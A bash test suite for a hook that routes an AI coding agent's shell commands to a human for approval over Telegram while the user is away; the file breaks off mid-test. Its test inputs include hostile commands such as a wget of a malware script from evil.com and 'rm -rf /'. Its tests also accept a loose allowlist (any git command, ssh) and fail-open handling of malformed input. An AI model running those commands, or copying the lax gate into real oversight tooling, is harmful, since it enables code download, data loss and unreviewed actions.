#!/usr/bin/env bash
# Tests for global/hooks/afd-relay.sh — PreToolUse hook for AFK permission approval
source "$(dirname "$0")/test-helpers.sh"

HOOK_SCRIPT="$REPO_ROOT/global/hooks/afd-relay.sh"

suite_header "afd-relay.sh (PreToolUse AFK relay)"

# ── Helpers ──────────────────────────────────────────────────────────────────

# Build JSON input matching what Claude Code sends to PreToolUse hooks.
# Uses python3 for reliable JSON encoding (handles quotes, special chars).
make_json() {
    local tool_name="${1:-Bash}"
    local command="${2:-}"
    local description="${3:-}"
    python3 << PYEOF
import json
d = {"tool_name": "$tool_name", "tool_input": {}}
cmd = """$command"""
desc = """$description"""
if cmd:
    d["tool_input"]["command"] = cmd
if desc:
    d["tool_input"]["description"] = desc
print(json.dumps(d))
PYEOF
}

# Run the hook with controlled HOME (and therefore controlled marker/afd paths).
# The hook uses $HOME to derive AFK_MARKER, USER_ACTIVE_MARKER, and AFD_CLI.
# By overriding HOME to MOCK_HOME, all paths resolve under our temp directory.
#
# Set HOOK_AFK_TIMEOUT before calling to override (default: 5s for fast tests).
# Set HOOK_AFK_TIMEOUT="USE_DEFAULT" to NOT pass AFD_AFK_TIMEOUT at all,
# letting the hook use its own default (3600).
# Returns exit code; captures stdout in $HOOK_STDOUT, stderr in $HOOK_STDERR.
run_hook_with() {
    local json_input="$1"
    shift

    local rc=0
    HOOK_STDOUT=""
    HOOK_STDERR=""

    local out_file="$TEST_TMPDIR/stdout.txt"
    local err_file="$TEST_TMPDIR/stderr.txt"

    local timeout_val="${HOOK_AFK_TIMEOUT:-5}"

    if [[ "$timeout_val" == "USE_DEFAULT" ]]; then
        # Don't set AFD_AFK_TIMEOUT — let the hook use its own ${AFD_AFK_TIMEOUT:-3600}
        env -u AFD_AFK_TIMEOUT \
            HOME="$MOCK_HOME" \
            "$@" \
            bash "$HOOK_SCRIPT" \
            < <(printf '%s' "$json_input") \
            > "$out_file" 2> "$err_file" || rc=$?
    else
        HOME="$MOCK_HOME" \
            AFD_AFK_TIMEOUT="$timeout_val" \
            "$@" \
            bash "$HOOK_SCRIPT" \
            < <(printf '%s' "$json_input") \
            > "$out_file" 2> "$err_file" || rc=$?
    fi

    HOOK_STDOUT="$(cat "$out_file")"
    HOOK_STDERR="$(cat "$err_file")"
    return "$rc"
}

# Set up a fresh MOCK_HOME with no markers (not AFK).
# Places the mock afd CLI at $MOCK_HOME/.local/bin/afd — exactly where
# the hook expects it (AFD_CLI="${HOME}/.local/bin/afd").
setup_mock_home() {
    MOCK_HOME="$TEST_TMPDIR/home"
    mkdir -p "$MOCK_HOME/.local/bin"
    MOCK_AFD="$MOCK_HOME/.local/bin/afd"
    export MOCK_AFD_LOG="$TEST_TMPDIR/afd-calls.log"

    # Default mock afd: logs calls, returns success for notify, approved for poll
    cat > "$MOCK_AFD" << 'EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
EOF
    chmod +x "$MOCK_AFD"
}

# Create AFK marker
set_afk() {
    touch "$MOCK_HOME/.afd-afk"
}

# Create user-active marker (newer than AFK)
set_user_active() {
    # Ensure user-active is newer than afk marker
    sleep 0.05
    touch "$MOCK_HOME/.afd-user-active"
}

# Replace the mock afd with a custom script
set_mock_afd() {
    cat > "$MOCK_AFD"
    chmod +x "$MOCK_AFD"
}

# ── Non-Bash tools always allowed ───────────────────────────────────────────

test_non_bash_tool_allowed_no_afk() {
    setup_mock_home
    local json
    json=$(make_json "Read")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Read tool should be allowed when not AFK"
}
run_test "non-Bash tool (Read) allowed when not AFK" test_non_bash_tool_allowed_no_afk

test_non_bash_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Write")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Write tool should be allowed even during AFK"
}
run_test "non-Bash tool (Write) allowed during AFK" test_non_bash_tool_allowed_during_afk

test_edit_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Edit")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Edit tool should be allowed during AFK"
}
run_test "non-Bash tool (Edit) allowed during AFK" test_edit_tool_allowed_during_afk

test_glob_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Glob")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Glob tool should be allowed during AFK"
}
run_test "non-Bash tool (Glob) allowed during AFK" test_glob_tool_allowed_during_afk

test_mcp_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "mcp__github__get_issue")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "MCP tool should be allowed during AFK"
}
run_test "MCP tool allowed during AFK" test_mcp_tool_allowed_during_afk

test_task_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Task")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Task tool should be allowed during AFK"
}
run_test "non-Bash tool (Task) allowed during AFK" test_task_tool_allowed_during_afk

# ── AFK mode detection (marker file presence/absence) ───────────────────────

test_no_afk_marker_allows_all() {
    setup_mock_home
    # No AFK marker — rm should be allowed
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "dangerous command should be allowed when not AFK"
}
run_test "no AFK marker: dangerous command allowed" test_no_afk_marker_allows_all

test_afk_marker_triggers_approval() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    # With default mock (approved), should exit 0
    assert_eq "0" "$rc" "dangerous command during AFK should go through approval flow"
    # Verify afd was called
    assert_file_exists "$MOCK_AFD_LOG" "afd should have been called"
    assert_file_contains "$MOCK_AFD_LOG" "notify" "afd notify should have been called"
    assert_file_contains "$MOCK_AFD_LOG" "poll" "afd poll should have been called"
}
run_test "AFK marker present: dangerous command triggers approval" test_afk_marker_triggers_approval

# ── No secondary AFK deactivation (CFG-770, 2026-10-18) ─────────────────────
# AFK stays on through console typing until the user says "afk off".
# A user-active marker newer than the flag no longer ends AFK.

test_user_active_does_not_deactivate_afk() {
    setup_mock_home
    set_afk
    set_user_active
    local rc=0
    run_hook_with "$(make_json "Bash" "rm -rf /tmp/something")" || rc=$?
    assert_file_exists "$MOCK_HOME/.afd-afk" "AFK flag survives a newer user-active marker"
    assert_file_contains "$MOCK_AFD_LOG" "notify" "the command still goes through approval"
}
run_test "user-active marker does not end AFK (only 'afk off' does)" test_user_active_does_not_deactivate_afk

# ── Safe command allowlisting ────────────────────────────────────────────────

# Test each safe pattern individually
test_safe_ls() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "ls -la /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "ls should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG" "afd should not be called for safe command"
}
run_test "safe command: ls allowed during AFK" test_safe_ls

test_safe_cat() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "cat /etc/hostname")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "cat should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: cat allowed during AFK" test_safe_cat

test_safe_git() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "git status")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "git should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: git allowed during AFK" test_safe_git

test_safe_echo() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "echo hello world")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "echo should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: echo allowed during AFK" test_safe_echo

test_safe_grep() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "grep -r pattern /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "grep should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: grep allowed during AFK" test_safe_grep

test_safe_find() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "find /tmp -name foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "find should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: find allowed during AFK" test_safe_find

test_safe_head() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "head -20 /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "head should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: head allowed during AFK" test_safe_head

test_safe_tail() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "tail -f /var/log/syslog")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "tail should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: tail allowed during AFK" test_safe_tail

test_safe_which() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "which python3")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "which should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: which allowed during AFK" test_safe_which

test_safe_date() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "date +%Y-%m-%d")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "date should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: date allowed during AFK" test_safe_date

test_safe_pwd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "pwd")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "pwd should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: pwd allowed during AFK" test_safe_pwd

test_safe_wc() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "wc -l /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "wc should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: wc allowed during AFK" test_safe_wc

test_safe_stat() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "stat /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "stat should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: stat allowed during AFK" test_safe_stat

test_safe_du() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "du -sh /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "du should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: du allowed during AFK" test_safe_du

test_safe_readlink() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "readlink -f /tmp/link")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "readlink should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: readlink allowed during AFK" test_safe_readlink

test_safe_basename() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "basename /tmp/path/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "basename should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: basename allowed during AFK" test_safe_basename

test_safe_dirname() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "dirname /tmp/path/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "dirname should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: dirname allowed during AFK" test_safe_dirname

test_safe_realpath() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "realpath /tmp/link")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "realpath should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: realpath allowed during AFK" test_safe_realpath

test_safe_test_cmd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "test -f /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "test should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: test allowed during AFK" test_safe_test_cmd

test_safe_printf() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "printf hello")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "printf should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: printf allowed during AFK" test_safe_printf

test_safe_afd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "afd status")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "afd should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: afd allowed during AFK" test_safe_afd

test_safe_node() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "node --version")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "node should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: node allowed during AFK" test_safe_node

test_safe_diff() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "diff file1.txt file2.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "diff should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: diff allowed during AFK" test_safe_diff

test_safe_sort() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "sort /tmp/data.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "sort should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: sort allowed during AFK" test_safe_sort

test_safe_ssh() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "ssh vps uptime")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "ssh should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: ssh allowed during AFK" test_safe_ssh

test_safe_jq() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "jq .key /tmp/data.json")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "jq should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: jq allowed during AFK" test_safe_jq

# ── Dangerous command blocking (AFK, not in safe list) ──────────────────────

test_dangerous_rm() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for rm"
    assert_file_contains "$MOCK_AFD_LOG" "notify" "should send notification"
}
run_test "dangerous command: rm triggers approval" test_dangerous_rm

test_dangerous_kill() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "kill -9 12345")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for kill"
}
run_test "dangerous command: kill triggers approval" test_dangerous_kill

test_dangerous_npm_install() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "npm install some-package")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for npm install"
}
run_test "dangerous command: npm install triggers approval" test_dangerous_npm_install

test_dangerous_pip() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "pip install requests")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for pip"
}
run_test "dangerous command: pip install triggers approval" test_dangerous_pip

test_dangerous_curl() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "curl https://example.com/script.sh")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for curl"
}
run_test "dangerous command: curl triggers approval" test_dangerous_curl

test_dangerous_chmod() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "chmod 777 /tmp/secret")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for chmod"
}
run_test "dangerous command: chmod triggers approval" test_dangerous_chmod

test_dangerous_mv() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "mv /important/file /dev/null")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for mv"
}
run_test "dangerous command: mv triggers approval" test_dangerous_mv

test_dangerous_sudo() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "sudo systemctl restart sshd")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for sudo"
}
run_test "dangerous command: sudo triggers approval" test_dangerous_sudo

test_dangerous_python3() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "python3 script.py")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "python3 should trigger approval"
}
run_test "dangerous command: python3 triggers approval" test_dangerous_python3

test_dangerous_bash_c() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "bash -c whoami")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "bash -c should trigger approval"
}
run_test "dangerous command: bash -c triggers approval" test_dangerous_bash_c

test_dangerous_wget() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "wget https://evil.com/malware.sh")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "wget should trigger approval"
}
run_test "dangerous command: wget triggers approval" test_dangerous_wget

# ── Approval flow (afd poll returns "approved" → exit 0) ────────────────────

test_approval_flow_approved() {
    setup_mock_home
    set_afk
    # Default mock already returns "approved" for poll
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "approved command should exit 0"
    assert_contains "$HOOK_STDERR" "Approved" "stderr should mention approval"
}
run_test "approval flow: approved exits 0" test_approval_flow_approved

# ── Denial flow (afd poll returns "denied" → exit 2) ────────────────────────

test_approval_flow_denied() {
    setup_mock_home
    set_afk
    # Mock afd: notify succeeds, poll returns "denied"
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "denied"
    exit 0
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "denied command should exit 2"
    assert_contains "$HOOK_STDERR" "denied" "stderr should mention denial"
}
run_test "denial flow: denied exits 2" test_approval_flow_denied

# ── Timeout flow (afd poll times out → exit 2) ──────────────────────────────

test_approval_flow_timeout() {
    setup_mock_home
    set_afk
    # Mock afd: notify succeeds, poll returns timeout (non-zero exit, non-approved output)
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "timeout"
    exit 1
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    HOOK_AFK_TIMEOUT=1 run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "timed out command should exit 2"
    assert_contains "$HOOK_STDERR" "timeout" "stderr should mention timeout"
}
run_test "timeout flow: poll timeout exits 2" test_approval_flow_timeout

# ── Notification failure (afd CLI fails → exit 2) ───────────────────────────

test_notification_failure_no_id() {
    setup_mock_home
    set_afk
    # Mock afd: notify returns something without a notification ID
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Error: connection failed"
    exit 1
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when notification fails"
    assert_contains "$HOOK_STDERR" "Failed to send" "stderr should indicate notification failure"
}
run_test "notification failure: no ID extracted exits 2" test_notification_failure_no_id

test_notification_failure_empty_output() {
    setup_mock_home
    set_afk
    # Mock afd: notify returns empty
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo ""
    exit 0
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when notification returns empty"
}
run_test "notification failure: empty output exits 2" test_notification_failure_empty_output

test_notification_failure_afd_missing() {
    setup_mock_home
    set_afk
    # Remove the mock afd entirely
    rm -f "$MOCK_AFD"

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when afd CLI is missing"
    assert_contains "$HOOK_STDERR" "afd CLI not found" "stderr should indicate afd is missing"
}
run_test "notification failure: afd binary missing exits 2" test_notification_failure_afd_missing

# ── Approval code generation ────────────────────────────────────────────────

test_approval_code_in_notification() {
    setup_mock_home
    set_afk
    # Mock afd that captures ALL args (including multiline) with NUL separator
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #99 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc"

    # Read the full log (multiline args are NUL-separated)
    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "Permission needed" "notification should contain permission request"
    assert_contains "$log_content" "--ref" "notification should contain --ref for approval code"
}
run_test "approval code included in notification message" test_approval_code_in_notification

# ── Notification message contents ────────────────────────────────────────────

test_notification_includes_description() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temporary build artifacts")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "Delete temporary build artifacts" "notification should contain description"
}
run_test "notification message includes tool description" test_notification_includes_description

test_notification_includes_command() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "rm -rf /tmp/something" "notification should contain the command"
}
run_test "notification message includes the command" test_notification_includes_command

# ── Poll passes notification ID ─────────────────────────────────────────────

test_poll_uses_notification_id() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #77 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "77" "poll should use the notification ID from notify response"
}
run_test "poll passes correct notification ID" test_poll_uses_notification_id

# ── Poll uses AFD_AFK_TIMEOUT ───────────────────────────────────────────────

test_poll_uses_custom_timeout() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    HOOK_AFK_TIMEOUT=120 run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "--timeout 90" "poll waits the custom value minus the 30 s safety margin (call: $poll_call)"
}
run_test "poll uses AFD_AFK_TIMEOUT env var" test_poll_uses_custom_timeout

test_poll_default_timeout() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    # USE_DEFAULT tells run_hook_with to NOT set AFD_AFK_TIMEOUT,
    # so the hook falls through to its own ${AFD_AFK_TIMEOUT:-3600}
    HOOK_AFK_TIMEOUT="USE_DEFAULT" run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "--timeout 3570" "poll waits 3600 s minus the 30 s safety margin (call: $poll_call)"
}
run_test "poll uses default 3600 timeout when env var unset" test_poll_default_timeout

# ── Notify arguments structure ──────────────────────────────────────────────

test_notify_uses_telegram_channel() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "--channel" "should use --channel flag"
    assert_contains "$log_content" "telegram" "should specify telegram channel"
    assert_contains "$log_content" "--type" "should use --type flag"
    assert_contains "$log_content" "permission" "should specify permission type"
    assert_contains "$log_content" "--priority" "should use --priority flag"
    assert_contains "$log_content" "high" "should specify high priority"
}
run_test "notify uses correct flags (telegram, permission, high)" test_notify_uses_telegram_channel

# ── JSON input parsing ──────────────────────────────────────────────────────

test_json_missing_tool_name() {
    setup_mock_home
    set_afk
    # JSON with no tool_name → should default to empty string, not Bash → exit 0
    local rc=0
    run_hook_with '{"tool_input": {"command": "rm -rf /"}}' || rc=$?
    assert_eq "0" "$rc" "missing tool_name should not be treated as Bash"
}
run_test "JSON parsing: missing tool_name treated as non-Bash" test_json_missing_tool_name

test_json_empty_command() {
    setup_mock_home
    set_afk
    # Bash with empty command → goes through safe check, empty matches nothing → triggers approval
    local rc=0
    run_hook_with '{"tool_name": "Bash", "tool_input": {"command": ""}}' || rc=$?
    # Empty command won't match safe patterns but mock approves → exit 0
    assert_eq "0" "$rc"
    # Should have triggered approval flow for empty command
    assert_file_exists "$MOCK_AFD_LOG" "empty command should trigger approval (not in safe list)"
}
run_test "JSON parsing: empty command triggers approval" test_json_empty_command

test_json_missing_command_key() {
    setup_mock_home
    set_afk
    # Bash with no command key in tool_input
    local rc=0
    run_hook_with '{"tool_name": "Bash", "tool_input": {}}' || rc=$?
    # Should trigger approval flow (empty command not in safe list), mock approves
    assert_eq "0" "$rc"
}
run_test "JSON parsing: missing command key handled gracefully" test_json_missing_command_key

test_json_missing_description() {
    setup_mock_home
    set_afk
    # Bash command with no description
    local rc=0
    run_hook_with '{"tool_name": "Bash", "tool_input": {"command": "rm -rf /tmp/foo"}}' || rc=$?
    assert_eq "0" "$rc" "missing description should not break flow"
    assert_file_exists "$MOCK_AFD_LOG" "should still trigger approval"
}
run_test "JSON parsing: missing description handled gracefully" test_json_missing_description

test_json_malformed_input() {
    setup_mock_home
    set_afk
    # Completely malformed JSON
    local rc=0
    run_hook_with 'not json at all' || rc=$?
    # python3 JSON parse fails → tool_name is empty → not Bash → exit 0
    assert_eq "0" "$rc" "malformed JSON should not crash, treated as non-Bash"
}
run_test "JSON parsing: malformed JSON handled gracefully" test_json_malformed_input

# ── Edge cases ──────────────────────────────────────────────────────────────

test_git_is_safe_even_with_destructive_args() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "git push --force origin main")
    local rc=0
    run_hook_with "$json" || rc=$?
    # The safe pattern is "^git " — any git command passes
